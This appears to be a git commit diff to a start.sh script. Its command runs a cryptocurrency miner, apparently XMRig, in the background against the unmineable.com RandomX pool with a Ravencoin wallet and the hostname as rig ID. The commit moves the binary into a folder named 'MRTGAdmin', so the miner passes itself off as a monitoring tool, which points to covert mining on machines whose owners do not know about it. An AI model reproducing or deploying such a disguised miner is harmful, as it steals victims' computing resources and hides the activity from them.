9a49b27e249f28db48fddf190a94a5abc9fa0a68
wagepentathlon <96092863+wagepentathlon@users.noreply.github.com>
2021-12-19 16:08:32 -0600

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,2 +1,2 @@
 NAME="$(hostname)"
-./StartXMRig/Linux/MRTGAdmin -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=${NAME} -p x
+./MRTGAdmin/Linux/MRTGAdmin -B -o rx.unmineable.com:3333 -a rx -k -u RVN:RTbY46h1CnHKZgNmuNvjoprMgveTWQYVNg --rig-id=${NAME} -p x
